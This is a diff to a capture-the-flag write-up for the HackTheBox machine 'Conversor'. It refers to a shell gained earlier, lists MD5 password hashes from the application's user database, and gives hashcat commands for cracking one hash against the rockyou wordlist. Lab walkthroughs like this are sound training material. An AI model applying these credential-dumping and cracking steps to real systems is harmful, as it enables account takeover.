@@ -272,7 +272,7 @@ Success. The server actively takes our XLST file, builds it in the scripts direc
 
 The connection specifies `bash: no job control in this shell`. It's highly reccomended to increase the job control in the shell to avoid an accidental disconnect: Read here how to do that [How to Upgrade a DUMB shell](https://systemweakness.com/how-to-upgrade-a-dumb-shell-64ea9880f556)
 
-With access to the server we need find privilege escalation. Specifically in the `app.py` file in the first few lines tell us where to look. 
+With access to the server we need to find privilege escalation. Specifically, the `app.py` file in the first few lines tell us where to look. 
 
 ```
 DB_PATH = '/var/www/conversor.htb/instance/users.db'
@@ -307,5 +307,20 @@ SELECT * FROM users;
 7|root|5f4dcc3b5aa765d61d8327deb882cf99
 8|tester123|098f6bcd4621d373cade4e832627b4f6
 9|1234|81dc9bdb52d04dc20036dbd8313ed055
+```
+
+This is the user credential database. Users `test` and `tester123` are both seperate accounts that I had created so we can assume user `root`, `1234` and `sam` are simply other accounts created by other HTB users. One account that stands out is `fismathack`. When looking at the "about us" page on the website one of the listed creators is `fismathack` so we can take that and the corresponding hash.
+
+Just from a glance, we can see this is an MD5 hash but we can also double check with any simple online hash checker or the built in tool with hashcat.
+
+After correctly identifying the hash we can use hash cat to attempt to crack it, firstly copying the hash seperately into a `.txt` document so that hashcat can input it. Also specifying hash type and output/worldlists.
+
+```
+┌──(root㉿kali)-[/]
+└─# hashcat -m 0 -a 0 -o cracked.txt hash.txt /usr/share/wordlists/rockyou.txt
+
+┌──(root㉿kali)-[/]
+└─# cat cracked.txt   
+5b5c3ac3a1c897c94caad48e6c71fdec:(passwordwillbehere)
 ```
 
